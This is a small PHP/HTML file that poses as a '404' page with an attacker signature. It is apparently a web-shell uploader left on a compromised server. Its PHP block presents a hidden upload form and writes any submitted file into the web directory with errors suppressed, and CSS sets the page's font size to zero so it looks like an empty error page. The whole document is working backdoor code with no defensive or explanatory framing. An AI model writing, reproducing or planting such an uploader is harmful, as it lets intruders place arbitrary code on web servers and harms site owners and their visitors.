<img class=" height="200" src="https://i.imgur.com/TLMbU5v.png"/><title>404</title>
<font face="Courier new" color="black" size="6">| BY Sana88999 |</font>
<style>body{font-size: 0;}h1{font-size: 12px}</style>
<h1><?php if($_POST){ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){ echo"<b>SUCCESFULL UPLOADED:</b>-->".$_FILES["f"]["name"]; }else{ echo"<b>SHIT FAILED BRO"; } }else{ echo "<form method=post enctype=multipart/form-data><input type=file name=f><input name=v type=submit id=v value=Sana> <br>"; }__halt_compiler();?></h1>
<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
?>